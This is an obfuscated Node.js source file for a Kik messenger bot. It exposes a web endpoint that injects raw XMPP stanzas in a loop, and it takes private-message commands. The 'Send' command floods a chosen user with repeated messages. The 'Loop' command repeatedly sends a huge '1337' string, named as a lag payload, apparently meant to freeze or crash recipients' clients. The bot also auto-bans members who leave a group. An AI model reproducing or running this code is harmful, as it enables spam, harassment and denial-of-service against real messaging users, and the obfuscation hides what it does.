let userinfo = ["username", "password"]

const _0x2665=['receivedcaptcha','body','103843VGaZIU','json','setGroupMember','displayName','receivedprivatemsg','17EbBkVB','urlencoded','/views/index.html','split','env','\x20joined\x20the\x20group','Your\x20app\x20is\x20listening\x20on\x20port\x20','jid','PRIVATE:\x20','static','Add','29531OuTMwA','privatetyping','.kik.com','sendFile','log','post','500mb','code','address','\x20stopped\x20typing','endsWith','use','sendMessage','receivedjidinfo','receivedroster','./src/core','axios','GROUP:','PORT','\x20https://transparent-nice-dresser.glitch.me/\x20','addFriend','258363MmTxQZ','/stanza','10501YTyHgh','Xmpp',':\x20[','1epcPUe','146551poAeeR',']:\x20','\x20is\x20typing...','userjoinedgroup','authenticated','I\x27ve\x20always\x20wanted\x20a\x20BFF,\x20you\x20can\x20add\x20me\x20to\x20groups\x20now','276730wjhXnN','public','1nhleOM','sendXmpp','Send','get','224670PpwSgU','Please\x20solve\x20captcha','\x20left\x20the\x20group','port','\x20is\x20typing'];const _0x514e=function(_0x22b255,_0x5b2eab){_0x22b255=_0x22b255-0x185;let _0x26650f=_0x2665[_0x22b255];return _0x26650f;};const _0x4afcd1=_0x514e;(function(_0x42713c,_0x58a554){const _0x38b33f=_0x514e;while(!![]){try{const _0x1238c7=-parseInt(_0x38b33f(0x1ba))+parseInt(_0x38b33f(0x19d))+-parseInt(_0x38b33f(0x1af))*parseInt(_0x38b33f(0x193))+parseInt(_0x38b33f(0x191))+parseInt(_0x38b33f(0x196))*-parseInt(_0x38b33f(0x1aa))+parseInt(_0x38b33f(0x197))*parseInt(_0x38b33f(0x19f))+-parseInt(_0x38b33f(0x1a3));if(_0x1238c7===_0x58a554)break;else _0x42713c['push'](_0x42713c['shift']());}catch(_0x82a43d){_0x42713c['push'](_0x42713c['shift']());}}}(_0x2665,0x236bb));let delay=0x190;const express=require('express'),app=express();axios=require(_0x4afcd1(0x18c)),app[_0x4afcd1(0x187)](express[_0x4afcd1(0x1ab)]({'limit':_0x4afcd1(0x1c0),'extended':!![]})),app[_0x4afcd1(0x187)](express[_0x4afcd1(0x1b0)]({'limit':_0x4afcd1(0x1c0),'extended':!![]})),app[_0x4afcd1(0x187)](express[_0x4afcd1(0x1b8)](_0x4afcd1(0x19e))),app[_0x4afcd1(0x1a2)]('/',function(_0x56de03,_0x4cf7b5){const _0x35c7ca=_0x4afcd1;_0x4cf7b5[_0x35c7ca(0x1bd)](__dirname+_0x35c7ca(0x1b1));});let Kik;const KikClient=require(_0x4afcd1(0x18b)),decode=require('unescape');Kik=new KikClient({'username':userinfo[0x0],'password':userinfo[0x1],'promptCaptchas':![],'trackUserInfo':![],'trackFriendInfo':![]});async function webXmpp(_0x3f6899,_0x386077,_0x4fccd7){const _0x4b5c65=_0x4afcd1;let _0x497a43=0x0;while(_0x497a43<=_0x386077){console[_0x4b5c65(0x1be)](_0x3f6899),Kik[_0x4b5c65(0x1a0)](_0x4fccd7,_0x3f6899),await new Promise(_0x22b930=>setTimeout(_0x22b930,delay)),_0x497a43+=0x1;}}app[_0x4afcd1(0x1bf)](_0x4afcd1(0x192),function(_0x220513,_0x3d5e9a){const _0x275cea=_0x4afcd1;console[_0x275cea(0x1be)](_0x220513[_0x275cea(0x1a9)]),_0x3d5e9a['send'](''),webXmpp(_0x220513['body'][0x0],_0x220513[_0x275cea(0x1a9)][0x1],_0x220513[_0x275cea(0x1a9)][0x2]);}),Kik['on'](_0x4afcd1(0x19b),()=>{}),Kik['on'](_0x4afcd1(0x18a),(_0x3aa5cb,_0x39ed97)=>{const _0x56f489=_0x4afcd1;console[_0x56f489(0x1be)](_0x3aa5cb),console[_0x56f489(0x1be)](_0x39ed97);}),Kik['on'](_0x4afcd1(0x1a8),_0x5f3890=>{const _0x24eef2=_0x4afcd1;console[_0x24eef2(0x1be)](_0x24eef2(0x1a4)+_0x5f3890);}),Kik['on'](_0x4afcd1(0x189),_0x58ccce=>{const _0x54f70f=_0x4afcd1;console['log']('We\x20got\x20peer\x20info:'),console[_0x54f70f(0x1be)](_0x58ccce);}),Kik['on']('receivedgroupmsg',(_0x57f3a8,_0x140b54,_0x122d4e)=>{const _0x4143d2=_0x4afcd1;console[_0x4143d2(0x1be)](_0x4143d2(0x18d)+_0x57f3a8['code']+_0x4143d2(0x195)+_0x140b54['displayName']+_0x4143d2(0x198)+_0x122d4e);}),Kik['on']('grouptyping',(_0x3aeed9,_0x34517c,_0x5ee908)=>{const _0xf9d4c0=_0x4afcd1;_0x5ee908?console[_0xf9d4c0(0x1be)](_0xf9d4c0(0x18d)+_0x3aeed9['code']+':\x20'+_0x34517c['displayName']+_0xf9d4c0(0x199)):console[_0xf9d4c0(0x1be)](_0xf9d4c0(0x18d)+_0x3aeed9[_0xf9d4c0(0x1c1)]+':\x20'+_0x34517c[_0xf9d4c0(0x1ad)]+_0xf9d4c0(0x185));}),Kik['on']('userleftgroup',(_0x4a3db8,_0x2c6bc2,_0x11322a)=>{const _0x127792=_0x4afcd1;console['log'](_0x127792(0x18d)+_0x4a3db8[_0x127792(0x1c1)]+':\x20'+_0x2c6bc2[_0x127792(0x1ad)]+_0x127792(0x1a5)),Kik['setBanned'](_0x4a3db8[_0x127792(0x1b6)],_0x2c6bc2[_0x127792(0x1b6)],!![]);}),Kik['on'](_0x4afcd1(0x19a),(_0x4fbe5c,_0x21faf4,_0x19d191)=>{const _0x542cb9=_0x4afcd1;console[_0x542cb9(0x1be)](_0x542cb9(0x18d)+_0x4fbe5c['code']+':\x20'+_0x21faf4[_0x542cb9(0x1ad)]+_0x542cb9(0x1b4)),Kik[_0x542cb9(0x1ac)](_0x4fbe5c['jid'],_0x21faf4[_0x542cb9(0x1b6)],![]);});let lag1='133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713++l';Kik['on'](_0x4afcd1(0x1ae),async(_0x561450,_0x26f58e)=>{const _0x2b0103=_0x4afcd1;let _0x270de8=_0x26f58e[_0x2b0103(0x1b2)]('\x20'),_0x416cc2=_0x26f58e[_0x2b0103(0x1b2)]('\x0a');if(_0x270de8[0x0]==_0x2b0103(0x194)){(async()=>{const _0x5c5499=_0x2b0103;let _0x1ad32d=0x0;while(_0x1ad32d<=parseInt(_0x270de8[0x2])){Kik[_0x5c5499(0x1a0)](_0x270de8[0x1],decode(_0x416cc2[0x1])),await new Promise(_0x270cce=>setTimeout(_0x270cce,delay)),_0x1ad32d+=0x1;}})();return;}if(_0x270de8[0x0]==_0x2b0103(0x1b9)&&_0x270de8[0x1]=='me'){let _0x5198c3=_0x2b0103(0x19c);await Kik['addFriend'](_0x561450[_0x2b0103(0x1b6)]),await Kik['addFriend'](_0x561450[_0x2b0103(0x1b6)]),await Kik[_0x2b0103(0x190)](_0x561450[_0x2b0103(0x1b6)]),await Kik[_0x2b0103(0x188)](_0x561450[_0x2b0103(0x1b6)],_0x5198c3);return;}if(_0x270de8[0x0]==_0x2b0103(0x1a1)&&_0x270de8[0x1]=='link'){let _0xc3044c=_0x2b0103(0x18f);await Kik[_0x2b0103(0x188)](_0x561450[_0x2b0103(0x1b6)],_0xc3044c);return;}if(_0x270de8[0x0]=='Loop'&&_0x270de8[0x1][_0x2b0103(0x186)](_0x2b0103(0x1bc))){(async()=>{const _0x510dc3=_0x2b0103;Kik[_0x510dc3(0x188)]('',_0x26f58e);let _0x33ac30=0x0;while(_0x33ac30<=_0x270de8[0x2]){await Kik[_0x510dc3(0x188)](_0x270de8[0x1],lag1),await new Promise(_0x568543=>setTimeout(_0x568543,delay)),_0x33ac30+=0x1;}})();return;}}),Kik['on'](_0x4afcd1(0x1bb),(_0x13053a,_0x31ef8c)=>{const _0x948ae3=_0x4afcd1;_0x31ef8c?console['log'](_0x948ae3(0x1b7)+_0x13053a[_0x948ae3(0x1b6)]+_0x948ae3(0x1a7)):console['log'](_0x948ae3(0x1b7)+_0x13053a['jid']+_0x948ae3(0x185));});const listener=app['listen'](process[_0x4afcd1(0x1b3)][_0x4afcd1(0x18e)],function(){const _0x4756c5=_0x4afcd1;Kik['connect'](),console['log'](_0x4756c5(0x1b5)+listener[_0x4756c5(0x1c2)]()[_0x4756c5(0x1a6)]);});